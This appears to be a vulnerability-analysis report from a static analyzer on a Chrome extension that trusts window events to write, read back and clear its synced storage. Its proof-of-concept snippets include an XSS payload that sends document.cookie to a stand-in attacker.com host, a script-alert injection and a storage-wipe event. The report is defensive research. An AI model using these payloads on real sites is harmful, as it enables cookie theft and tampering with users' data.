# CoCo Analysis: gfdfpaanddeedpifliooolgmnlkajiho

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (plus 1 clear operation)

---

## Sink 1: cs_window_eventListener_saveSettings → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gfdfpaanddeedpifliooolgmnlkajiho/opgen_generated_files/cs_0.js
Line 501: `window.addEventListener("saveSettings", function(data) {`
Line 502: `let detail = data.detail;`

**Code:**

```javascript
// Content script - Entry point (cs_0.js)
window.addEventListener("saveSettings", function(data) {
    let detail = data.detail; // ← attacker-controlled
    console.log("[IAHelper] Received saveSettings event: ", detail);
    chrome.storage.sync.set({settings: detail}, function() { // ← SINK: storage write
        console.log('[IAHelper] Settings saved successfully');
    });
});

// Later: Retrieval path
function retrieveSavedSettings() {
    chrome.storage.sync.get(['settings'], function(result) { // ← storage read
        console.log("[IAHelper] Retrieved saved settings: ", result);
        window.dispatchEvent(new CustomEvent("loadSettings", {detail: result})); // ← data sent back to attacker
    });
}

function injectJS() {
    $.getScript(chrome.runtime.getURL("ia-inject-script.js"), function (data) {
        console.log("[IAHelper] Injected page JS");
        retrieveSavedSettings(); // ← automatically retrieves after injection
        retrieveSavedTasks();
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (window.addEventListener)

**Attack:**

```javascript
// Step 1: Malicious webpage poisons storage with XSS payload
window.dispatchEvent(new CustomEvent("saveSettings", {
    detail: {
        maliciousKey: "<img src=x onerror='fetch(\"https://attacker.com?cookie=\"+document.cookie)'>",
        // Or any other malicious data the extension will use
    }
}));

// Step 2: Extension automatically retrieves and dispatches the poisoned data
// When retrieveSavedSettings() is called, it reads the poisoned storage
// and dispatches it back via CustomEvent

// Step 3: Attacker listens for the event to retrieve poisoned data
window.addEventListener("loadSettings", function(event) {
    console.log("Retrieved poisoned data:", event.detail);
    // Attacker now has confirmation and can trigger further exploitation
    // The extension will use this poisoned data in its UI/logic
});
```

**Impact:** Complete storage exploitation chain. Attacker can inject arbitrary data into chrome.storage.sync, which is then automatically retrieved and dispatched back to the webpage via CustomEvent. This allows the attacker to poison the extension's persistent storage and retrieve it, potentially injecting malicious payloads that affect the extension's behavior or other users if storage is synced.

---

## Sink 2: cs_window_eventListener_saveTasks → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gfdfpaanddeedpifliooolgmnlkajiho/opgen_generated_files/cs_0.js
Line 508: `window.addEventListener("saveTasks", function(data) {`
Line 509: `let detail = data.detail;`

**Code:**

```javascript
// Content script - Entry point (cs_0.js)
window.addEventListener("saveTasks", function(data) {
    let detail = data.detail; // ← attacker-controlled
    console.log("[IAHelper] Received saveTasks event: ", detail);
    chrome.storage.sync.set({tasks: detail}, function() { // ← SINK: storage write
        console.log('[IAHelper] Tasks saved successfully');
    });
});

// Later: Retrieval path
function retrieveSavedTasks() {
    chrome.storage.sync.get(['tasks'], function(result) { // ← storage read
        console.log("[IAHelper] Retrieved saved tasks: ", result);
        window.dispatchEvent(new CustomEvent("loadTasks", {detail: result})); // ← data sent back to attacker
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (window.addEventListener)

**Attack:**

```javascript
// Step 1: Poison tasks storage
window.dispatchEvent(new CustomEvent("saveTasks", {
    detail: {
        task1: "malicious_task_data",
        task2: "<script>alert('XSS')</script>",
        // Arbitrary attacker-controlled data
    }
}));

// Step 2: Retrieve poisoned tasks
window.addEventListener("loadTasks", function(event) {
    console.log("Retrieved poisoned tasks:", event.detail);
    // Attacker can confirm storage poisoning worked
});

// The extension will automatically call retrieveSavedTasks()
// which reads and dispatches the poisoned data back
```

**Impact:** Same as Sink 1 - complete storage exploitation chain. Attacker can poison the "tasks" storage key and retrieve it back via CustomEvent. The extension runs on legendsofidleon.com (per manifest), so any malicious script on that domain (or XSS vulnerability there) can exploit this to manipulate the extension's stored task data.

---

## Additional Finding: chrome_storage_sync_clear_sink

**CoCo Trace:**
No specific line trace provided by CoCo for this detection.

**Code:**

```javascript
window.addEventListener("clearStorage", function(data) {
    console.log("[IAHelper] Received clearStorage event, clearing!")
    clearStorage();
})

function clearStorage() {
    chrome.storage.sync.clear(function() {
        console.log("[IAHelper] Storage Cleared!");
    });
}
```

**Classification:** TRUE POSITIVE (Minor Impact)

**Attack Vector:** DOM event (window.addEventListener)

**Attack:**

```javascript
// Attacker can clear all extension storage
window.dispatchEvent(new CustomEvent("clearStorage"));
```

**Impact:** Denial of Service - attacker can clear all extension storage, deleting user's saved settings and tasks. While less severe than data poisoning, this disrupts the extension's functionality.
